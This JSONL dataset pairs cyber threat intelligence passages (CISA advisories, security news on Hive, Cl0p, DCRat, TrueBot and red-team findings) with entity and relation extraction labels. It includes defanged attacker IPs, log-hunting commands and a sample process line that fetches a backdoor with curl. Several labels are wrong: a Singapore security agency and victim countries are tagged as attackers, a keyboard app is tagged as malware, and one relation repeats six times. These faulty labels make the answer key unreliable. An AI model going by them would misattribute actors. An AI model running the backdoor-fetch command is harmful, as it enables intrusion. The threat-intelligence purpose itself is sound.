{"instruction": "Detection: Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0029]. Detection: Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [DS0009]. System Network Configuration Discovery: Internet Connection Discovery T1016.001 The actors\u2019 malware tests for internet connectivity by pinging 8.8.8.8. Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping) [DS0009] that may check for internet connectivity on compromised systems. Lateral Movement Technique Title ID Use Recommendations Remote Services: Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network. Mitigation: Use MFA for remote logins [M1032]. Mitigation: Disable the RDP service if it is unnecessary [M1042].", "input": null, "output": "Named Entities: (ping.exe, file), (tracert.exe, file), (8.8.8.8, IP)\nRelationships: No related relations."}
{"instruction": "This command gave the service account the ability to access other users\u2019 mailboxes. The APT cyber actors used virtual private network (VPN) and virtual private server (VPS) providers, M247 and SurfShark, as part of their techniques to remotely access the Microsoft Exchange server. Use of these hosting providers, which serves to conceal interaction with victim networks, are common for these threat actors. According to CISA\u2019s analysis of the victim\u2019s Microsoft Exchange server Internet Information Services (IIS) logs, the actors used the account of a former employee to access the EWS. EWS enables access to mailbox items such as email messages, meetings, and contacts. The source IP address for these connections is mostly from the VPS hosting provider, M247. Use of Custom Exfiltration Tool: CovalentStealer The threat actors employed a custom exfiltration tool, CovalentStealer, to exfiltrate sensitive files.", "input": null, "output": "Named Entities: (APT cyber actors, attacker), (M247, tool), (SurfShark, tool), (Microsoft Exchange server, tool), (EWS, tool), (CovalentStealer, malware)\nRelationships: (APT cyber actors, access, Microsoft Exchange server), (Microsoft Exchange server, access, EWS), (Microsoft Exchange server, IP, M247), (CovalentStealer, use, Microsoft Exchange server)"}
{"instruction": "\u201cGET /courier/about.html?aid=1000 HTTP/1.1\u201d 200 {Response size} \u201cGET /courier/about.htmldwn={Encrypted Path}&fn={encrypted file name} HTTP/1.1\u201d 200 {Response size} When the clean-up function is run, it modifies archived Apache access logs /var/opt/apache/c1s1-access_log.*.gz and replaces the file contents with the following string: Binary file (standard input) matches In two incidents, the Cybersecurity and Infrastructure Security Agency (CISA) observed a large amount of data transferred over port 443 from federal agency IP addresses to 194.88.104[.]24. In one incident, the Cyber Security Agency of Singapore observed multiple TCP sessions with IP address 45.135.229[.]179.", "input": null, "output": "Named Entities: (Cyber Security Agency of Singapore, attacker), (194.88.104[.]24, IP), (45.135.229[.]179, IP)\nRelationships: No related relations."}
{"instruction": "February 2020 \u2013 China\u2019s Military Indicted for 2017 Equifax Hack: DOJ indicted members of China\u2019s PLA for stealing large amounts of PII and IP. The Chinese cyber threat actors exploited a vulnerability in the company\u2019s dispute resolution website to enter the network, conduct reconnaissance, upload malware, and steal credentials to extract the targeted data. The breach impacted roughly half of all American citizens and stole Equifax\u2019s trade secrets.[9] May 2020 \u2013 China Targets COVID-19 Research Organizations: the Federal Bureau of Investigation (FBI) and CISA reported the targeting and compromise of U.S. organizations conducting COVID-19-related research by cyber actors affiliated with China.[10] Large-scale password spraying campaigns were a commonly observed tactic in illicitly obtaining IP related to vaccines, treatments, and testing from networks and personnel affiliated with COVID-19-related research.[11],[12] Common TTPs of Publicly Known Chinese Threat Actors", "input": null, "output": "Named Entities: (China's PLA, attacker)\nRelationships: (China's PLA, upload, malware), (password spraying campaigns, tactic), (password spraying campaigns, obtain, IP related to vaccines, treatments, and testing)"}
{"instruction": "Technical Details\nCISA analysts observed an unknown malicious cyber actor sending a phishing email to various Federal Civilian Executive Branch and state, local, tribal, and territorial government recipients. The phishing email contains:\nA subject line, SBA Application \u2013 Review and Proceed\nA sender, marked as disastercustomerservice@sba[.]gov\nText in the email body urging the recipient to click on a hyperlink to address:hxxps://leanproconsulting[.]com.br/gov/covid19relief/sba.gov\nThe domain resolves to IP address: 162.214.104[.]246\nFigure 1 is a screenshot of the webpage arrived at by clicking on the hyperlink.\n\u200b\nFigure 1: Webpage arrived at via malicious hyperlink.", "input": null, "output": "Named Entities: (malicious cyber actor, attacker), (phishing email, threat type), (hxxps://leanproconsulting[.]com.br/gov/covid19relief/sba.gov, URL), (162.214.104[.]246, IP)\nRelationships: (malicious cyber actor, send, phishing email), (phishing email, URL, hxxps://leanproconsulting[.]com.br/gov/covid19relief/sba.gov)"}
{"instruction": "Per TrustedSec, a sign of successful exploitation would be a POST request to a URI containing /../ or /vpn, followed by a GET request to an XML file. If any exploitation activity exists\u2014attempted or successful\u2014analysts should be able to identify the attacking Internet Protocol address(es). Tyler Hudak\u2019s blog provided sample logs indicating what a successful attack would look like.[3] 10.1.1.1 - - [10/Jan/2020:13:23:51 +0000] \"POST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\" 200 143 \"https://10.1.1.2/\" \"USERAGENT \" 10.1.1.1 - - [10/Jan/2020:13:23:53 +0000] \"GET /vpn/../vpns/portal/backdoor.xml HTTP/1.1\" 200 941 \"-\" \"USERAGENT\" Additionally, FireEye provided the following grep commands to assist with log review and help to identify suspicious activity.[4] grep -iE 'POST.*\\.pl HTTP/1\\.1\\\" 200 ' /var/log/httpaccess.log -A 1 grep -iE 'GET.*\\.xml HTTP/1\\.1\\\" 200' /var/log/httpaccess.log -B 1 Running Processes Review Context: Host Hunt Type: Methodology Reviewing the running processes on a system suspected of compromise for processes running under the nobody user can identify potential backdoors.", "input": null, "output": "Named Entities: (10.1.1.1, IP), (10.1.1.2, IP), (/var/log/httpaccess.log, file)\nRelationships: No related relations."}
{"instruction": "ps auxd | grep nobody Analysts should review the ps output for suspicious entries such as this: nobody 63390 0.0 0.0 8320 16 ?? I 1:35PM 0:00.00 | | `\u2013 sh -c uname &amp; curl -o \u2013 http://10.1.1.2/backdoor Further pivoting can be completed using the Process ID from the PS output: lsof -p <pid> Due to the nature of this exploit, it is likely that any processes related to a backdoor would be running under the httpd process.", "input": null, "output": "Named Entities: (nobody, attacker), (10.1.1.2, IP), (backdoor, threat type)\nRelationships: No related relations."}
{"instruction": "\"During FlawedGrace's execution phase, the RAT stores encrypted payloads within the registry. The tool can create scheduled tasks and inject payloads into msiexec[.]exe and svchost[.]exe, which are command processes that enable FlawedGrace to establish a command and control (C2) connection to 92.118.36[.]199, for example, as well as load dynamic link libraries (DLLs) to accomplish privilege escalation,\" the advisory says. The cybercriminals initiate Cobalt Strike beacons within several hours of the first intrusion. These beacons facilitate post-exploitation tasks, including stealing data and installing ransomware or different malware payloads. While previous versions of the TrueBot malware were typically spread through malicious email attachments, the updated versions leverage the CVE-2022-31199 vulnerability to gain initial access.", "input": null, "output": "Named Entities: (FlawedGrace, malware), (RAT, tool), (msiexec[.]exe, file), (svchost[.]exe, file), (92.118.36[.]199, IP), (Cobalt Strike, tool), (TrueBot, malware), (CVE-2022-31199, vulnerability)\nRelationships: (RAT, inject, msiexec[.]exe), (RAT, inject, svchost[.]exe), (FlawedGrace, establish, C2 connection to 92.118.36[.]199)"}
{"instruction": "The July 2021 exploitation is said to have originated from an IP address (45.129.137[.]232) that was previously attributed to the Cl0p actor in connection with attempts to exploit flaws in SolarWinds Serv-U product around the same time. \"This is the third time Cl0p ransomware group have used a zero day in webapps for extortion in three years,\" security researcher Kevin Beaumont said. \"In all three cases they were products with security in the branding.\" Found this article interesting? Follow us on Twitter \uf099 and LinkedIn to read more exclusive content we post.", "input": null, "output": "Named Entities: (45.129.137[.]232, IP), (Cl0p actor, attacker), (Cl0p ransomware group, attacker)\nRelationships: No related relations."}
{"instruction": "An analysis of the reverse-engineered version of the PYC file reveals that it's configured to collect usernames, hostnames, and directory listings, as well as fetch commands to be executed on the host from a hard-coded server (13.51.44[.]246). ReversingLabs said it also observed the module download and run another Python script that's responsible for fetching new commands placed within a file that can be tweaked at will by the threat actor to issue different instructions. Further examination of the command-and-control server unearthed a misconfiguration that made it possible to download the stolen files by their ID, which are numbered in sequential order (starting from 1), sans any authorization. This indicates that the attack was most likely not orchestrated by a sophisticated actor. The development is a continuation of efforts on the part of threat actors to adopt different obfuscation techniques in order to evade detection from security solutions.", "input": null, "output": "Named Entities: (13.51.44[.]246, IP), (Python script, tool), (command-and-control server, tool)\nRelationships: (Python script, download and run, Python script)"}
{"instruction": "Essential Addons for Elementor Plugin Flaw Actively Exploited\nWordfence, in its own advisory, said the critical vulnerability in the Essential Addons for Elementor plugin is being actively exploited in the wild, and that it blocked 200 attacks targeting the flaw in the past 24 hours, making it imperative that users move quickly to update to the latest version.\nThe WordPress security company also noted a majority of the exploitation attempts originated from a single IP address 78.128.60[.]112, followed by 23.224.195[.]51 and 212.113.119[.]6.\nFound this article interesting? Follow us on Twitter \uf099 and LinkedIn to read more exclusive content we post.\n", "input": null, "output": "Named Entities: (78.128.60[.]112, IP), (23.224.195[.]51, IP), (212.113.119[.]6, IP)\nRelationships: No related relations."}
{"instruction": "The latest infection sequence documented by Fortinet is no different, leading to the deployment of an unspecified strain of RAT that's capable of communicating with a remote server and launching additional payloads. The development is an indication that SideCopy has continued to carry out spear-phishing email attacks that use Indian government and defense forces-related social engineering lures to drop a wide range of malware. Source: Team Cymru Further analysis of the Action RAT command-and-control (C2) infrastructure by Team Cymru has identified outbound connections from one of the C2 server IP addresses to another address 66.219.22[.]252, which is geolocated in Pakistan. The cybersecurity company also said it observed \"communications sourced from 17 distinct IPs assigned to Pakistani mobile providers and four Proton VPN nodes,\" noting inbound connections to the IP address from IP addresses assigned to Indian ISPs.", "input": null, "output": "Named Entities: (RAT, malware), (SideCopy, attacker), (Action RAT, malware), (C2 server, tool), (66.219.22[.]252, IP)\nRelationships: (SideCopy, carry out, spear-phishing email attacks)"}
{"instruction": "The fifth vulnerability included in the list is an information disclosure flaw in Arm Mali GPU Kernel Driver (CVE-2023-26083) that was revealed by Google's Threat Analysis Group (TAG) last month as abused by an unnamed spyware vendor as part of an exploit chain to break into Samsung's Android smartphones. Federal Civilian Executive Branch (FCEB) agencies have time till April 28, 2023, to apply the patches to secure their networks against potential threats. The advisory also comes as Apple released updates for iOS, iPadOS, macOS, and Safari web browser to address a pair of zero-day flaws (CVE-2023-28205 and CVE-2023-28206) that it said has been exploited in real-world attacks.", "input": null, "output": "Named Entities: (CVE-2023-26083, vulnerability), (spyware vendor, attacker), (CVE-2023-28205, vulnerability), (CVE-2023-28206, vulnerability)\nRelationships: (Google's Threat Analysis Group, reveal, CVE-2023-26083), (spyware vendor, abuse, CVE-2023-26083)"}
{"instruction": "It's worth noting that the Android keyboard app Ai.type suffered a data breach in December 2017, leading to the accidental leak of emails, phone numbers, and locations pertaining to 31 million users. Further data obtained from Google showed that Fitzpatrick registered a new Google account with the email address conorfitzpatrick2002@gmail.com in May 2019 to replace conorfitzpatrick02@gmail.com, which was closed around April 2020. What's more, a search for conorfitzpatrick02@gmail.com on the data breach notification service Have I Been Pwned (HIBP) corroborates the fact the old email address was indeed exposed in the Ai.type breach. \"The recovery email address for conorfitzpatrick2002@gmail.com was funmc59tm@gmail.com,\" the affidavit reads. \"Subscriber records for this account reveal that the account was registered under the name 'a a,' and created on or about December 28, 2018 from the IP address 74.101.151.4.\"", "input": null, "output": "Named Entities: (Ai.type, malware), (data breach, threat type), (Fitzpatrick, attacker), (74.101.151.4, IP)\nRelationships: (Ai.type, suffered, data breach)"}
{"instruction": "Collected artifacts\nSHA1\n14836dd608efb4a0c552a4f370e5aafb340e2a5d\nSHA256\n6d08ed6acac230f41d9d6fe2a26245eeaf08c84bc7a66fddc764d82d6786d334\nMD5\nd36f15bef276fd447e91af6ee9e38b28\nSSDEEP\n3072:DDiv2GSyn88sH888wQ2wmVgMk/211h36vEcIyNTY4WZd/w1UwIwEoTqPMinXHx+i:XOayy\nIPv4:\nIOC\nDescription\n20[.]199.13.167:8080\nLimeRAT's Command and Control server\nDomains:\nIOC\nDescription\nhttps://pastebin[.]com/raw/sxNJt2ek\nPasteBin used by LimeRAT to hide its original Command and Control server\nMITRE ATT&CK\u00ae\nTactic\nTechnique\nDescription\nTA0005: Defense Evasion\nT1027: Obfuscated Files or Information\nMalware is using obfuscator to strip its method names, class names, etc.\nTA0005: Defense Evasion \nT1027: Obfuscated Files or Information\nMalware uses Base64 algorithm to encode and decode data\nTA0005: Defense Evasion\nT1027: Obfuscated Files or Information\nMalware uses AES algorithm to encrypt and decrypt data", "input": null, "output": "No related entities and relations."}
{"instruction": "Initialization Script for RAR1Ransom and GuardMiner\nAnother noticeable payload is from 67[.]205[.]145[.]142. It contains two sessions, each has different commands depending on the victim\u2019s operation system. One leveraged PowerShell to download \u201cinit.ps1\u201d, the other uses curl, wget, and urlopen in Python library to download \u201cinit.sh\u201d.", "input": null, "output": "Named Entities: (RAR1Ransom, malware), (GuardMiner, malware), (67[.]205[.]145[.]142, IP), (PowerShell, tool), (curl, tool), (wget, tool), (urlopen, tool)\nRelationships: No related relations."}
{"instruction": "Unfortunately, an initial attack vector has not been identified. Potential victims likely received emails with a malicious attachment with identical Ukrainian file names such as: \u201c\u0421\u041f\u0418\u0421\u041e\u041a_\u043f\u043e\u0441\u0438\u043b\u0430\u043d\u044c \u043d\u0430 \u0456\u043d\u0442\u0435\u0440\u0430\u043a\u0442\u0438\u0432\u043d\u0456 \u043a\u0430\u0440\u0442\u0438.xlsm\u201d, except using the Excel format. English translation \u201cINFORMATION on the placement of information about the fund of protective structures of civil defense on the official web resources of regional and Kyiv city state administrations, territorial bodies of the SES.\u201d (The SES stands for \u201cState Emergency Service.\u201d) The spreadsheet contains malicious macros that if enabled, drop and execute \u201cnew.bat\u201d. This contains PowerShell code that downloads MSDriverLoader.exe from 72[.]167[.]223[.]219. It then saves the file as C:\\Users\\Public\\MSLoader.exe and executes it. Note that macros from the internet, such as an email attachment, are now blocked by default in Microsoft Office. MSLoader.exe then downloads and executes MSDriverMonitor.exe from 203[.]96[.]191[.]70. This file is a Remote Access Trojan (RAT) called Dark Crystal RAT (DCRat).", "input": null, "output": "Named Entities: (new.bat, file), (MSDriverLoader.exe, file), (C:\\Users\\Public\\MSLoader.exe, file), (MSDriverMonitor.exe, file), (Dark Crystal RAT, malware), (72[.]167[.]223[.]219, IP), (203[.]96[.]191[.]70, IP)\nRelationships: (C:\\Users\\Public\\MSLoader.exe, execute, MSDriverLoader.exe), (MSDriverLoader.exe, download, MSDriverMonitor.exe), (MSDriverMonitor.exe, execute, Dark Crystal RAT), (Dark Crystal RAT, RAT, MSDriverMonitor.exe), (MSDriverLoader.exe, IP, 72[.]167[.]223[.]219), (MSDriverMonitor.exe, IP, 203[.]96[.]191[.]70)"}
{"instruction": "A remote attacker may be able to exploit this vulnerability to leak memory within the context of the application, via a crafted TGA file. Fortinet released IPS signature Autodesk.Design.Review.CVE-2022-27526.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2022-27527 This is a memory corruption vulnerability existing in AutoDesk Navisworks. Specifically, the vulnerability is caused by a malformed PDF file, which causes an out-of-bounds memory access, due to improper bounds checking when manipulating a pointer to an allocated buffer. Attackers can exploit this vulnerability to execute arbitrary code within the context of the application via a crafted PDF file. Fortinet released IPS signature Autodesk.Navisworks.CVE-2022-27527.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2022-25797", "input": null, "output": "Named Entities: (CVE-2022-27526, vulnerability), (CVE-2022-27527, vulnerability), (AutoDesk Navisworks, tool)\nRelationships: No related relationships."}
{"instruction": "Impact: Multiple vulnerabilities leading to Arbitrary Code Execution or Information Disclosure. Severity level: Critical and Important Following are some details on these vulnerabilities. More information can be found on the related Fortinet Zero Day Advisory pages by clicking on the CVE links, below: CVE-2022-23186 This is an Arbitrary Code Execution vulnerability that exists in the decoding of CorelDraw Drawing (CDR) files in Adobe Illustrator. Specifically, the vulnerability is caused by a malformed CDR file, which causes an Out of Bounds Write memory access due to an improper bounds check. A remote attacker may be able to exploit this vulnerability to execute arbitrary code within the context of the application via a crafted CDR file. Fortinet released IPS signature Adobe.Illustrator.CVE-2022-23186.Arbitrary.Code.Execution for this specific vulnerability to proactively protect our customers. CVE-2022-23188", "input": null, "output": "Named Entities: (CVE-2022-23186, vulnerability), (Adobe Illustrator, tool), (Fortinet, tool)\nRelationships: (Fortinet, released, IPS signature Adobe.Illustrator.CVE-2022-23186.Arbitrary.Code.Execution)"}
{"instruction": "Attackers can exploit this vulnerability by using out-of-bounds access for unintended reads or an information leak attack. An unauthenticated attacker may be able to exploit this vulnerability to access unauthorized system memory in the context of the current user via a crafted CDR file. Fortinet released the IPS signature Corel.CorelDRAW.CVE-2021-38109.Memory.Corruption for this specific vulnerability to proactively protect our customers. CVE-2021-38107: This Memory Corruption Vulnerability exists in the decoding of CDR files in Corel DrawStandard 2020. Specifically, this vulnerability is caused by a malformed CDR file, which can cause Out-of-Bounds memory access due to improper bounds check. This specific vulnerability exists in the \u2018CdrCore.dll\u2019 library. Attackers can exploit this vulnerability by using out-of-bounds access for unintended reads or an information leak attack. An unauthenticated attacker may be able to exploit this vulnerability to access unauthorized system memory in the context of the current user via a crafted CDR file.", "input": null, "output": "Named Entities: (CVE-2021-38109, vulnerability)\uff0c (CVE-2021-38107, vulnerability), (Corel DrawStandard 2020, tool), (CdrCore.dll, file)\nRelationships: No related relationships."}
{"instruction": "Insight into C2 shipmentofficedepot[.]com. (195[.]123.234.11) Detailed analysis over a 30-day period revealed a large majority of connections from US-based victims (66%), followed, interestingly enough, by Mozambique (22%), Singapore (5%), and other countries at (1% or less).", "input": null, "output": "Named Entities: (195[.]123.234.11, IP), (US-based victims, attacker), (Mozambique, attacker), (Singapore, attacker)\nRelationships: (C2 shipmentofficedepot[.]com, seen in, US-based victims), (C2 shipmentofficedepot[.]com, seen in, Mozambique), (C2 shipmentofficedepot[.]com, seen in, Singapore)"}
{"instruction": "Msi.dll: A delayed-loaded DLL (not loaded until a user\u2019s code attempts to reference a symbol contained within the DLL) that will act as a dropper for a real WinSCP installer and a malicious Python execution environment responsible for downloading Cobalt Strike beacons. Once setup.exe is executed, it will call the msi.dll that will later extract a Python folder from the DLL RCDATA section as a real installer for WinSCP to be installed on the machine. Two installations of Python3.10 will be created \u2014 a legitimate python installation in %AppDataLocal%\\Python-3.10.10 and another installation in %Public%\\Music\\python containing a trojanized python310.dll. Finally, the DLL will create a persistence mechanism to make a run key named \u201cPython\u201d and the value C:\\Users\\Public\\Music\\python\\pythonw.exe. When the executable pythonw.exe starts, it loads a modified/trojanized obfuscated python310.dll that contains a Cobalt Strike beacon that connects to 167[.]88[.]164[.]141.", "input": null, "output": "Named Entities: (Msi.dll, file), (WinSCP installer, tool), (Python execution environment, tool), (Cobalt Strike beacons, tool), (setup.exe, file), (python310.dll, file), (%AppDataLocal%\\Python-3.10.10, file), (C:\\Users\\Public\\Music\\python\\pythonw.exe, file), (167[.]88[.]164[.]141, IP)\nRelationships: (Msi.dll, act as, WinSCP installer), (Msi.dll, act as, Python execution environment), (python310.dll, connect to, 167[.]88[.]164[.]141)"}
{"instruction": "Unfortunately, an initial attack vector has not been identified. Potential victims likely received emails with a malicious attachment with identical Ukrainian file names such as: \u201c\u0421\u041f\u0418\u0421\u041e\u041a_\u043f\u043e\u0441\u0438\u043b\u0430\u043d\u044c \u043d\u0430 \u0456\u043d\u0442\u0435\u0440\u0430\u043a\u0442\u0438\u0432\u043d\u0456 \u043a\u0430\u0440\u0442\u0438.xlsm\u201d, except using the Excel format. English translation \u201cINFORMATION on the placement of information about the fund of protective structures of civil defense on the official web resources of regional and Kyiv city state administrations, territorial bodies of the SES.\u201d (The SES stands for \u201cState Emergency Service.\u201d) The spreadsheet contains malicious macros that if enabled, drop and execute \u201cnew.bat\u201d. This contains PowerShell code that downloads MSDriverLoader.exe from 72[.]167[.]223[.]219. It then saves the file as C:\\Users\\Public\\MSLoader.exe and executes it. Note that macros from the internet, such as an email attachment, are now blocked by default in Microsoft Office. MSLoader.exe then downloads and executes MSDriverMonitor.exe from 203[.]96[.]191[.]70. This file is a Remote Access Trojan (RAT) called Dark Crystal RAT (DCRat).", "input": null, "output": "Named Entities: (new.bat, file), (MSDriverLoader.exe, file), (72[.]167[.]223[.]219, IP), (C:\\Users\\Public\\MSLoader.exe, file), (MSDriverMonitor.exe, file), (203[.]96[.]191[.]70, IP), (Dark Crystal RAT (DCRat), malware)\nRelationships: (new.bat, download and execute, MSDriverLoader.exe), (MSDriverLoader.exe, save as, C:\\Users\\Public\\MSLoader.exe), (C:\\Users\\Public\\MSLoader.exe, execute, MSDriverLoader.exe), (MSDriverLoader.exe, download and execute, MSDriverMonitor.exe), (MSDriverMonitor.exe, IP, 203[.]96[.]191[.]70)"}
{"instruction": "Conducting open-source research, the team identified an organizational branch [T1591] that likely had access to SBS 2. The team queried the AD to identify the branch\u2019s users and administrators. The team gathered a list of potential accounts, from which they identified administrators, such as SYSTEMS ADMIN or DATA SYSTEMS ADMINISTRATOR, with technical roles. Using their access to the MDM MySQL database, the team queried potential targets to (1) determine the target\u2019s last contact time with the MDM and (2) ensure any policy targeting the target\u2019s workstation would run relatively quickly [T1596.005]. Using the same methodology as described by the steps in the Plan for Potential Access to SBS 1 section above, the team gained interactive root access to two Site 6 SBS 2-connected workstations: a software engineering workstation (Workstation 5) and a user administrator workstation (Workstation 6).", "input": null, "output": "Named Entities: (T1591, technique), (AD, tool), (MDM MySQL database, tool), (T1596.005, technique)\nRelationships: No related ralations."}
{"instruction": "Detect and Identify source IP and source process of exfiltration Analyze host used for exfiltration once detected Develop response plan None Local Admin User Account Creation (workstation) Create a local administrator account on a target workstation system. Create Account: Local Account [T1136.001] Account Manipulation [T1098] Intrusion Detection or Prevention Systems Endpoint Protection Platform Web Proxy Logs Detect and identify source IP and source process of malicious traffic Investigate destination IP address Triage compromised host Develop response plan None Local Admin User Account Creation (server) Create a local administrator account on a target server system. Create Account: Local Account [T1136.001] Account Manipulation [T1098] Windows Event Logs Detect account creation Identify source of change Verify change with system owner Develop response plan None Active Directory Account Creation Create AD accounts and add it to domain admins group Create Account: Domain Account [T1136.002] Account Manipulation [T1098] Windows Event Logs Detect account creation", "input": null, "output": "Named Entities: (T1136.001, technique), (T1098, technique), (Intrusion Detection or Prevention Systems, tool), (Endpoint Protection Platform, tool), (Web Proxy Logs, tool), (Windows Event Logs, tool), (T1136.002, technique)\nRelationships: No related ralations."}
{"instruction": "Gather Victim Identity Information: Email Addresses T1589.002 The team found employee email addresses via open-source research. Gather Victim Identify Information: Employee Names T1589.003 The team identified employee names via open-source research that could be used to derive email addresses. Gather Victim Network Information: Network Security Appliances T1590.006 The team identified the organization\u2019s MDM vendor and leveraged that information to move laterally to SBS-connected assets. Gather Victim Org Information T1591 The team conducted open-source research and identified an organizational branch that likely had access to an SBS asset. Gather Victim Org Information: Determine Physical Locations T1591.001 The team conducted open-source research to identify the physical locations of upkeep/management staff of selected assets. Search Open Technical Databases: Scan Databases T1596.005 The team queried an MDM SQL database to identify target administrators who recently connected with the MDM. Resource Development Technique Title ID Use Acquire Infrastructure T1583", "input": null, "output": "Named Entities: (T1589.002, technique), (T1589.003, technique), (T1590.006, technique), (T1591, technique), (T1591.001, technique), (T1596.005, technique), (T1583, technique)\nRelationships: No related ralations."}
{"instruction": "The team used DLL hijacking to move laterally between sites. Privilege Escalation Technique Title ID Use Abuse Elevation Control Mechanism T1548 The team elevated user account privileges to administrator by modifying the user\u2019s account via adding Create Policy and Delete Policy permissions. Defense Evasion Technique Title ID Use Valid Accounts: Domain Accounts T1078.002 During Phase II, the team compromised a domain admin account and used it to laterally to multiple workstations and the DC. Credential Access Technique Title ID Use OS Credential Dumping: LSASS Memory T1003.001 The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called nanodump, exporting the output and processing the output offline with Mimikatz. OS Credential Dumping: DCSync T1003.006 The team harvested AES-256 hashes via DCSync. Brute Force: Password Cracking T1110.002", "input": null, "output": "Named Entities: (T1548, technique), (T1078.002, technique), (T1003.001, technique), (T1003.006, technique), (T1110.002, technique), (nanodump, tool), (Mimikatz, tool)\nRelationships: No related ralations."}
{"instruction": "The method of initial intrusion will depend on which affiliate targets the network. Hive actors have gained initial access to victim networks by using single factor logins via Remote Desktop Protocol (RDP), virtual private networks (VPNs), and other remote network connection protocols [T1133]. In some cases, Hive actors have bypassed multifactor authentication (MFA) and gained access to FortiOS servers by exploiting Common Vulnerabilities and Exposures (CVE) CVE-2020-12812. This vulnerability enables a malicious cyber actor to log in without a prompt for the user\u2019s second authentication factor (FortiToken) when the actor changes the case of the username. Hive actors have also gained initial access to victim networks by distributing phishing emails with malicious attachments [T1566.001] and by exploiting the following vulnerabilities against Microsoft Exchange servers [T1190]: CVE-2021-31207 - Microsoft Exchange Server Security Feature Bypass Vulnerability CVE-2021-34473 - Microsoft Exchange Server Remote Code Execution Vulnerability", "input": null, "output": "Named Entities: (Hive actors, attacker), (T1133, technique), (CVE-2020-12812, vulnerability), (T1566.001, technique), (CVE-2021-31207, vulnerability), (CVE-2021-34473, vulnerability)\nRelationships: (Hive actors, use, T1566.001), (Hive actors, exploit, CVE-2020-12812), (Hive actors, exploit, CVE-2021-31207), (Hive actors, exploit, CVE-2021-34473)"}
{"instruction": "CVE-2021-34523 - Microsoft Exchange Server Privilege Escalation Vulnerability After gaining access, Hive ransomware attempts to evade detention by executing processes to: Identify processes related to backups, antivirus/anti-spyware, and file copying and then terminating those processes to facilitate file encryption [T1562]. Stop the volume shadow copy services and remove all existing shadow copies via vssadmin on command line or via PowerShell [T1059] [T1490]. Delete Windows event logs, specifically the System, Security and Application logs [T1070]. Prior to encryption, Hive ransomware removes virus definitions and disables all portions of Windows Defender and other common antivirus programs in the system registry [T1112]. Hive actors exfiltrate data likely using a combination of Rclone and the cloud storage service Mega.nz [T1537]. In addition to its capabilities against the Microsoft Windows operating system, Hive ransomware has known variants for Linux, VMware ESXi, and FreeBSD.", "input": null, "output": "Named Entities: (CVE-2021-34523, vulnerability), (Hive ransomware, malware), (T1562, technique), (T1059, technique), (T1490, technique), (T1070, technique), (T1112, technique), (T1537, technique), (Rclone, tool), (Mega.nz, tool), (vssadmin, tool), (PowerShell, tool)\nRelationships: (Hive ransomware, exploit, CVE-2021-34523), (Hive ransomware, use, T1537), (Hive ransomware, use, T1537), (Hive ransomware, use, T1537), (Hive ransomware, use, T1537), (Hive ransomware, use, T1537), (Hive ransomware, use, T1537), (Hive ransomware, use, Rclone), (Rclone, use, Mega.nz), (Hive ransomware, use, vssadmin), (Hive ransomware, use, PowerShell)"}
{"instruction": "During the encryption process, a file named *.key (previously *.key.*) is created in the root directory (C:\\ or /root/). Required for decryption, this key file only exists on the machine where it was created and cannot be reproduced. The ransom note, HOW_TO_DECRYPT.txt is dropped into each affected directory and states the *.key file cannot be modified, renamed, or deleted, otherwise the encrypted files cannot be recovered [T1486]. The ransom note contains a \u201csales department\u201d .onion link accessible through a TOR browser, enabling victim organizations to contact the actors through a live chat panel to discuss payment for their files. However, some victims reported receiving phone calls or emails from Hive actors directly to discuss payment.", "input": null, "output": "Named Entities: (HOW_TO_DECRYPT.txt, file), (T1486, technique), (TOR browser, tool), (Hive actors, attacker)\nRelationships: No related ralations."}
{"instruction": "MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations. For additional mitigations, see the Mitigations section. Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization\u2019s VMware Horizon server. Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050]. Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches [M1016],[M1051]. Execution Technique Title ID Use Recommendation Command and Scripting Interpreter: PowerShell T1059.001 The actors ran PowerShell commands that added an exclusion rule to Windows Defender. The actors executed PowerShell on the AD to obtain a list of machines on the domain.", "input": null, "output": "Named Entities: (T1190, technique), (VMware Horizon server, tool), (Windows Defender, tool), (AD, tool)\nRelationships: No related ralations."}
{"instruction": "Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services. [M1018]. Detection: Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender [DS0024]. Detection: Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [DS0013]. Detection: Monitor processes for unexpected termination related to security tools/services [DS0009]. Indicator Removal on Host: File Deletion T1070.004 The actors removed malicious file mde.ps1 from the dis. Detection: Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017]. Detection: Monitor for unexpected deletion of files from the system [DS0022]. Credential Access Technique Title ID Use Recommendations OS Credential Dumping: LSASS Memory", "input": null, "output": "Named Entities: (T1070.004, technique), (mde.ps1, file)\nRelationships: No related ralations."}
